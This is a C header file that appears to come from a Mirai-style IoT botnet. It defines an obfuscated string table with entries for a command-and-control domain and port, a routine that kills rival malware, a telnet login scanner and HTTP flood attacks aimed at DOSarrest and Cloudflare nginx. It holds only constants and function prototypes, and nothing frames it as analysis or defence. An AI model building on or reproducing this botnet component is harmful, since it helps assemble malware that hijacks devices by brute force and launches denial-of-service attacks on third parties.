#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};

#define TABLE_PROCESS_ARGV              1
#define TABLE_EXEC_SUCCESS              2
#define TABLE_CNC_DOMAIN                3
#define TABLE_CNC_PORT                  4               
#define TABLE_KILLER_SAFE               5
#define TABLE_KILLER_PROC               6
#define TABLE_KILLER_EXE                7
#define TABLE_KILLER_DELETED            8
#define TABLE_KILLER_FD                 9
#define TABLE_KILLER_ANIME              10
#define TABLE_KILLER_STATUS             11
#define TABLE_MEM_QBOT                  12
#define TABLE_MEM_QBOT2                 13
#define TABLE_MEM_QBOT3                 14
#define TABLE_MEM_UPX                   15
#define TABLE_MEM_ZOLLARD               16
#define TABLE_MEM_REMAITEN              17                    
#define TABLE_SCAN_CB_DOMAIN            18
#define TABLE_SCAN_CB_PORT              19
#define TABLE_SCAN_SHELL                20
#define TABLE_SCAN_ENABLE               21
#define TABLE_SCAN_SYSTEM               22
#define TABLE_SCAN_SH                   23
#define TABLE_SCAN_QUERY                24
#define TABLE_SCAN_RESP                 25
#define TABLE_SCAN_NCORRECT             26
#define TABLE_SCAN_PS                   27
#define TABLE_SCAN_KILL_9               28                   
#define TABLE_ATK_VSE                   29
#define TABLE_ATK_RESOLVER              30
#define TABLE_ATK_NSERV                 31
#define TABLE_ATK_KEEP_ALIVE            32
#define TABLE_ATK_ACCEPT                33
#define TABLE_ATK_ACCEPT_LNG            34
#define TABLE_ATK_CONTENT_TYPE          35
#define TABLE_ATK_SET_COOKIE            36
#define TABLE_ATK_REFRESH_HDR           37
#define TABLE_ATK_LOCATION_HDR          38
#define TABLE_ATK_SET_COOKIE_HDR        39
#define TABLE_ATK_CONTENT_LENGTH_HDR    40
#define TABLE_ATK_TRANSFER_ENCODING_HDR 41
#define TABLE_ATK_CHUNKED               42
#define TABLE_ATK_KEEP_ALIVE_HDR        43
#define TABLE_ATK_CONNECTION_HDR        44
#define TABLE_ATK_DOSARREST             45
#define TABLE_ATK_CLOUDFLARE_NGINX      46
#define TABLE_HTTP_1                  	47
#define TABLE_HTTP_2                  	48
#define TABLE_HTTP_3                	49
#define TABLE_HTTP_4                 	50 
#define TABLE_HTTP_5                 	51
#define TABLE_HTTP_6                 	52
#define TABLE_HTTP_7                 	53
#define TABLE_HTTP_8                 	54
#define TABLE_HTTP_9                 	55
#define TABLE_HTTP_10                 	56
#define TABLE_HTTP_11                 	57
#define TABLE_HTTP_12                 	58
#define TABLE_HTTP_13                 	59
#define TABLE_HTTP_14                 	60
#define TABLE_HTTP_15                 	61
#define TABLE_MISC_WATCHDOG				62
#define TABLE_MISC_WATCHDOG2			63
#define TABLE_SCAN_ASSWORD				64
#define TABLE_SCAN_OGIN					65
#define TABLE_SCAN_ENTER				66
#define TABLE_MISC_RAND					67
#define TABLE_KILLER_DEVNULL			68
#define TABLE_KILLER_COOKIE				69
#define TABLE_KILLER_ASSWORD			70
#define TABLE_KILLER_OGIN				71
#define TABLE_KILLER_ENTER				72
#define TABLE_KILLER_WATCHDOG			73
#define TABLE_KILLER_WATCHDOG2			74
#define TABLE_KILLER_HTTP				75
#define TABLE_KILLER_NETSLINK			76
#define TABLE_KILLER_NVALID				77
#define TABLE_KILLER_SERNAME			78
#define TABLE_KILLER_ENIED				79
#define TABLE_KILLER_BINSH				80

#define TABLE_MAX_KEYS  81

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
